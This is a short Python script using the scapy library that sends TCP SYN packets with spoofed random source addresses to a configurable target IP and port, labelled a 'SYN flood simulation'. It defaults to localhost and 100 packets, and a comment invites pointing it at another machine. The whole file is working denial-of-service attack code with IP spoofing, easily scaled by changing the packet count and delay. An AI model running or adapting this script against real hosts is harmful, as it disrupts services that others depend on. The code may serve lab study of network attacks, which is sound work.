from scapy.all import IP, TCP, send
import random
import time

# Target configuration
target_ip = "127.0.0.1"      # Change this to your target machine's IP if needed
target_port = 80             # Target port (commonly HTTP port)

# Number of attack packets to send
num_packets = 100

print("🚀 Starting SYN flood simulation...")

for i in range(num_packets):
    src_ip = f"192.168.1.{random.randint(1, 254)}"
    ip_layer = IP(src=src_ip, dst=target_ip)
    tcp_layer = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
    packet = ip_layer / tcp_layer
    send(packet, verbose=False)
    time.sleep(0.1)  # small delay between packets

print(" SYN flood simulation complete.")
